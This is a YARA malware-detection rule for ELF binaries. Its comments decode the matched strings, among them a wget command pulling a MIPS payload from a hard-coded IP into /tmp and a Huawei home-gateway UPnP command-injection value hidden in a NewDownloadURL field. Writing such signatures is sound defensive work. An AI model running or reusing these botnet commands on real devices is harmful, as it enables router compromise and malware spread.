rule _1fce1d5b977c38e491fe84e529a3eb5730d099a4966c753b551209f4a24524f3 { 
    meta : 
        author = "Z4que - All rights reverved"
		date = "25/10/2024"

    strings : 
        $header = { 7F 45 4C 46 }
        
        // wget -g 185.172.110.214 -l /tmp/kh -r /mips
        $b1 = { 77 67 65 74 20 2D 67 20 31 38 35 2E 31 37 32 2E 31 31 30 2E 32 31 34 20 2D 6C 20 2F 74 6D 70 2F 6B 68 20 2D 72 20 2F 6D 69 70 73 }
        
        // HuaweiHomeGateway
        $b2 = { 48 75 61 77 65 69 48 6F 6D 65 47 61 74 65 77 61 79 }
            
        // 88645cefb1f9ede0e336e3569d75ee30
        $b3 = { 38 38 36 34 35 63 65 66 62 31 66 39 65 64 65 30 65 33 33 36 65 33 35 36 39 64 37 35 65 65 33 30 }
        
        // 3612f843a42db38f48f59d2a3597e19c
        $b4 = { 33 36 31 32 66 38 34 33 61 34 32 64 62 33 38 66 34 38 66 35 39 64 32 61 33 35 39 37 65 31 39 63 }
        
        // algorithm="MD5"
        $b5 = { 61 6C 67 6F 72 69 74 68 6D 3D 22 4D 44 35 22 }
        
        // <NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>
        $b6 = { 3C 4E 65 77 44 6F 77 6E 6C 6F 61 64 55 52 4C 3E 24 28 65 63 68 6F 20 48 55 41 57 45 49 55 50 4E 50 29 3C 2F 4E 65 77 44 6F 77 6E 6C 6F 61 64 55 52 4C 3E }
        
    condition : 
        ( $header at 0 ) 
        and 5 of ( $b* ) 
        and filesize < 1000KB
}